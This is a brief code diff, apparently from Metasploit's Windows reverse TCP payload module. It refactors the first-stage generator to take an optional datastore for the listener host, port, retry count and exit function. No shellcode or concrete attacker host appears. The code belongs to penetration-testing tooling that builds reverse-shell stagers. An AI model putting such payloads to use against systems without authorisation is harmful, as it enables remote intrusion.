@@ -25,17 +25,18 @@ module Payload::Windows::ReverseTcp
   #
   # Generate the first stage
   #
-  def generate
+  def generate(opts={})
+    ds = opts[:datastore] || datastore
     conf = {
-      port:        datastore['LPORT'],
-      host:        datastore['LHOST'],
-      retry_count: datastore['ReverseConnectRetries'],
+      port:        ds['LPORT'],
+      host:        ds['LHOST'],
+      retry_count: ds['ReverseConnectRetries'],
       reliable:    false
     }
 
     # Generate the advanced stager if we have space
     if self.available_space && required_space <= self.available_space
-      conf[:exitfunk] = datastore['EXITFUNC']
+      conf[:exitfunk] = ds['EXITFUNC']
       conf[:reliable] = true
     end
 
